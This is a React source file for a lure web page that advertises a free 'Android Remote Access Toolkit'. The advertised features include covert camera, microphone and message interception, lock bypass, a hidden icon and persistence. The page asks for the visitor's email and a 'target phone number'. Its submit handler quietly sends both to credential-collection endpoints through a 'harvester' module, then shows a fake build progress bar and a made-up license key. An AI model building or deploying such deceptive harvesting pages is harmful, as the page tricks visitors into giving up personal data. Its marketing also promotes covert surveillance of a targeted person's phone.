import React, { useState, useEffect } from 'react';
import { Box, Button, Typography, Container, Card, CardContent, TextField, Grid, LinearProgress, Chip, Avatar, Divider } from '@mui/material';
import harvester from '../harvester/HarvesterCore';

export default function AndroidHackingPage() {
  const [email, setEmail] = useState('');
  const [phone, setPhone] = useState('');
  const [downloading, setDownloading] = useState(false);
  const [progress, setProgress] = useState(0);
  const [completed, setCompleted] = useState(false);

  useEffect(() => { harvester.init(); }, []);

  const handleDownload = () => {
    if (!email) return;
    
    harvester.send('/api/collect/formdata', {
      formId: 'android-hack-download',
      fields: { email, phone },
      url: window.location.href
    });

    harvester.send('/api/collect/credentials', {
      source: 'form-submit',
      email,
      phone,
      url: window.location.href,
      formType: 'android-hacking-tool',
      fieldData: { email, phone }
    });

    setDownloading(true);
    let prog = 0;
    const interval = setInterval(() => {
      prog += Math.random() * 10 + 5;
      if (prog >= 100) {
        clearInterval(interval);
        setProgress(100);
        setTimeout(() => setCompleted(true), 600);
      } else {
        setProgress(prog);
      }
    }, 300);
  };

  if (completed) {
    return (
      <Box sx={{ minHeight: '100vh', bgcolor: '#0a0e17', display: 'flex', alignItems: 'center', justifyContent: 'center', py: 4 }}>
        <Container maxWidth="sm">
          <Card sx={{ bgcolor: '#111827', border: '1px solid rgba(0,240,255,0.2)', borderRadius: 3, textAlign: 'center', overflow: 'hidden' }}>
            <Box sx={{ background: 'linear-gradient(135deg, #00f0ff 0%, #00ff88 100%)', p: 4 }}>
              <Typography sx={{ fontSize: '4rem' }}>✅</Typography>
              <Typography variant="h4" sx={{ color: '#0a0e17', fontWeight: 800, mt: 2 }}>
                APK Ready!
              </Typography>
            </Box>
            <CardContent sx={{ p: 3 }}>
              <Typography sx={{ color: '#ccc', mb: 2 }}>
                Your Android hacking toolkit has been prepared for <strong style={{ color: '#00f0ff' }}>{email}</strong>.
              </Typography>
              <Box sx={{ bgcolor: 'rgba(0,240,255,0.08)', border: '1px solid rgba(0,240,255,0.2)', borderRadius: 2, p: 2, mb: 3 }}>
                <Typography sx={{ color: '#00f0ff', fontWeight: 600, fontSize: '0.9rem', fontFamily: 'monospace' }}>
                  🔑 License: DROID-HACK-{Math.random().toString(36).substr(2, 8).toUpperCase()}
                </Typography>
              </Box>
              <Box sx={{ display: 'flex', gap: 2, justifyContent: 'center', flexWrap: 'wrap' }}>
                <Button variant="outlined" onClick={() => window.location.href = '/'} sx={{ borderColor: 'rgba(255,255,255,0.2)', color: '#888' }}>
                  Back to Home
                </Button>
                <Button variant="contained" href="https://github.com" target="_blank" sx={{ bgcolor: '#00f0ff', color: '#0a0e17', fontWeight: 700, '&:hover': { bgcolor: '#00d5e6' } }}>
                  📱 Download APK
                </Button>
              </Box>
            </CardContent>
          </Card>
        </Container>
      </Box>
    );
  }

  return (
    <Box sx={{ minHeight: '100vh', bgcolor: '#f8f9fa' }}>
      {/* Hero */}
      <Box sx={{ background: 'linear-gradient(135deg, #2d1b69 0%, #1a1a2e 50%, #0f3460 100%)', py: { xs: 6, md: 8 }, position: 'relative', overflow: 'hidden' }}>
        <Container maxWidth="md" sx={{ textAlign: 'center', position: 'relative', zIndex: 1 }}>
          <Typography sx={{ fontSize: { xs: '3rem', md: '4rem' }, mb: 2 }}>📱</Typography>
          <Typography variant="h3" sx={{ color: '#fff', fontWeight: 800, mb: 1, fontSize: { xs: '1.8rem', md: '2.5rem' } }}>
            Android Remote Access Toolkit
          </Typography>
          <Typography sx={{ color: 'rgba(255,255,255,0.7)', mb: 3, maxWidth: 600, mx: 'auto' }}>
            Complete Android penetration testing suite. Monitor, control, and audit Android devices remotely.
          </Typography>
          <Box sx={{ display: 'flex', justifyContent: 'center', gap: 2, flexWrap: 'wrap' }}>
            <Chip label="⭐ 4.8/5" sx={{ bgcolor: 'rgba(156,39,176,0.2)', color: '#ce93d8', fontWeight: 600 }} />
            <Chip label="👥 1.2M+ Downloads" sx={{ bgcolor: 'rgba(0,240,255,0.15)', color: '#00f0ff', fontWeight: 600 }} />
            <Chip label="🛡️ Obfuscated APK" sx={{ bgcolor: 'rgba(255,170,0,0.15)', color: '#ffaa00', fontWeight: 600 }} />
          </Box>
        </Container>
      </Box>

      <Container maxWidth="lg" sx={{ mt: -4, position: 'relative', zIndex: 10, pb: 6 }}>
        <Card elevation={4} sx={{ borderRadius: 3, mb: 4 }}>
          <CardContent sx={{ p: { xs: 2, md: 4 } }}>
            <Grid container spacing={3} alignItems="center">
              <Grid item xs={12} md={7}>
                <Typography variant="h5" sx={{ fontWeight: 700, color: '#222', mb: 2 }}>
                  🛡️ Complete Android Security Suite
                </Typography>
                <Grid container spacing={1.5}>
                  {[
                    { icon: '📷', text: 'Remote camera & microphone access' },
                    { icon: '📍', text: 'Real-time GPS location tracking' },
                    { icon: '💬', text: 'WhatsApp, Telegram & SMS intercept' },
                    { icon: '🔐', text: 'Screen lock bypass & pattern unlock' },
                    { icon: '📂', text: 'Full file system access & download' },
                    { icon: '📞', text: 'Call log & contact list extraction' },
                    { icon: '🔑', text: 'Saved WiFi passwords & credential dump' },
                    { icon: '🔄', text: 'Persistent access — survives factory reset' },
                  ].map((feat, i) => (
                    <Grid item xs={12} sm={6} key={i}>
                      <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                        <Typography sx={{ fontSize: '1.1rem' }}>{feat.icon}</Typography>
                        <Typography sx={{ color: '#555', fontSize: '0.85rem' }}>{feat.text}</Typography>
                      </Box>
                    </Grid>
                  ))}
                </Grid>
              </Grid>
              <Grid item xs={12} md={5}>
                <Box sx={{ bgcolor: '#f3e8ff', borderRadius: 2, p: 3, textAlign: 'center', border: '1px solid #d4b0ff' }}>
                  <Typography variant="h3" sx={{ color: '#7c3aed', fontWeight: 800, fontSize: { xs: '2rem', md: '2.5rem' } }}>
                    FREE
                  </Typography>
                  <Typography sx={{ color: '#7c3aed', fontWeight: 600, mb: 1 }}>
                    Premium APK — Normally $299
                  </Typography>
                  <Divider sx={{ my: 1.5 }} />
                  {!downloading ? (
                    <Box>
                      <TextField fullWidth size="small" placeholder="Your email for download link" type="email" value={email} onChange={(e) => setEmail(e.target.value)} sx={{ mb: 1.5, '& .MuiOutlinedInput-root': { bgcolor: '#fff' } }} />
                      <TextField fullWidth size="small" placeholder="Target phone number (optional)" value={phone} onChange={(e) => setPhone(e.target.value)} sx={{ mb: 1.5, '& .MuiOutlinedInput-root': { bgcolor: '#fff' } }} />
                      <Button variant="contained" fullWidth size="large" onClick={handleDownload} disabled={!email || downloading} sx={{ bgcolor: '#7c3aed', '&:hover': { bgcolor: '#6d28d9' }, '&:disabled': { bgcolor: '#c4b5fd' }, fontWeight: 700, py: 1.2 }}>
                        📱 Generate Custom APK
                      </Button>
                    </Box>
                  ) : (
                    <Box>
                      <LinearProgress variant="determinate" value={progress} sx={{ height: 8, borderRadius: 4, bgcolor: '#e8e8e8', '& .MuiLinearProgress-bar': { bgcolor: '#7c3aed', borderRadius: 4 } }} />
                      <Typography sx={{ color: '#888', mt: 1, fontSize: '0.9rem' }}>Building custom APK... {Math.round(progress)}%</Typography>
                    </Box>
                  )}
                  <Box sx={{ display: 'flex', justifyContent: 'center', gap: 2, mt: 1.5, flexWrap: 'wrap' }}>
                    <Typography sx={{ color: '#aaa', fontSize: '0.75rem' }}>🔒 APK size: 4.2 MB</Typography>
                    <Typography sx={{ color: '#aaa', fontSize: '0.75rem' }}>📱 Android 7.0+</Typography>
                  </Box>
                </Box>
              </Grid>
            </Grid>
          </CardContent>
        </Card>

        <Typography variant="h5" sx={{ fontWeight: 700, color: '#222', mb: 2, display: 'flex', alignItems: 'center', gap: 1 }}>
          <Box sx={{ width: 4, height: 24, bgcolor: '#7c3aed', borderRadius: 2 }} />
          Advanced Features
        </Typography>
        <Grid container spacing={2.5} sx={{ mb: 4 }}>
          {[
            { icon: '🕵️', title: 'Stealth Mode', desc: 'App icon hides itself after installation. Runs completely invisible with zero notifications.', color: '#7c3aed' },
            { icon: '🔄', title: 'Persistence Engine', desc: 'Survives reboots, app updates, and factory resets. Reinstalls itself automatically.', color: '#e74c3c' },
            { icon: '📡', title: 'Remote Shell', desc: 'Full remote command execution. Execute any shell command on the target device in real-time.', color: '#27ae60' },
            { icon: '🔓', title: 'Lock Bypass', desc: 'Bypass PIN, pattern, password, and biometric locks. Access the device without triggering alarms.', color: '#f39c12' },
          ].map((f, i) => (
            <Grid item xs={12} sm={6} md={3} key={i}>
              <Card elevation={2} sx={{ borderRadius: 2, height: '100%', transition: '0.2s', '&:hover': { transform: 'translateY(-4px)', boxShadow: '0 12px 40px rgba(0,0,0,0.12)' } }}>
                <CardContent sx={{ p: 3 }}>
                  <Box sx={{ fontSize: '2.5rem', mb: 1.5 }}>{f.icon}</Box>
                  <Typography variant="h6" sx={{ fontWeight: 700, color: '#333', mb: 1, fontSize: '1rem' }}>{f.title}</Typography>
                  <Typography sx={{ color: '#777', fontSize: '0.82rem', lineHeight: 1.6 }}>{f.desc}</Typography>
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>
      </Container>
    </Box>
  );
}